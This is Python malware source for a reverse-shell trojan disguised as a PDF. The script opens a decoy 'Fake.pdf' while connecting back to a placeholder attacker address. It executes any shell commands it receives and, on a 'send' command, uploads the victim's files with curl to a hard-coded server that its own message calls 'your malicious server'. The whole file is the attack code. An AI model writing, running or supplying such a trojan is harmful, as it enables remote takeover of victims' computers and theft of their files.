import subprocess
import os
import socket
import shlex
import threading
import sys
import webbrowser
SERVER_URL = "http://192.168.88.105:2020"
def send_files(args):
    files_to_send = args[1:]
    if not files_to_send:
        print("No files provided to upload.")
        return
    valid_files = []
    for file_path in files_to_send:
        try:
            with open(file_path, "rb"):
                valid_files.append(file_path)
        except FileNotFoundError:
            print(f"File not found: {file_path}")
        except Exception as e:
            print(f"Cannot open {file_path}: {e}")
    if not valid_files:
        print("No valid files to send.")
        return
    curl_cmd = ["curl", "-X", "POST"]
    for file_path in valid_files:
        curl_cmd.extend(["-F", f"files=@{file_path}"])
    curl_cmd.append(f"{SERVER_URL}/upload")
    try:
        result = subprocess.run(curl_cmd,shell=True, capture_output=True, text=True)
        print("Server response:", result.stdout)
        if result.stderr:
            print("Errors:", result.stderr)
    except Exception as e:
        print(f"Failed to send files: {e}")
def open_pdf():
    print("Open pdf in webborwser....")
    if hasattr(sys, "_MEIPASS"):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(__file__)
    pdf_path = os.path.join(base_path, "Fake.pdf")
    webbrowser.open(pdf_path)
def connect_back():
    s = socket.socket()
    s.connect(("IP", "PORT"))
    while True:
        try:
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
                continue
            if cmd.startswith("send"):
                args_files = cmd.split()
                send_files(args_files)
                s.send(f"{"Files has been sent to your malicious server".encode("utf-8")}\n")
                continue
            if cmd.lower() == "exit":
                break
            if cmd.lower().startswith("cd"):
                try:
                    parts = shlex.split(cmd)
                    if len(parts) > 1:
                        os.chdir(parts[1])
                    s.send(f"{os.getcwd()}\n".encode())
                except Exception as e:
                    s.send(f"[-] {e}\n".encode())
                continue
            output = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True
            )
            result = output.stdout + output.stderr
            if result:
                s.send(result.encode())
        except Exception as e:
            s.send(f"[-] Error: {e}\n".encode())
    s.close()
threading.Thread(target=open_pdf).start()
connect_back()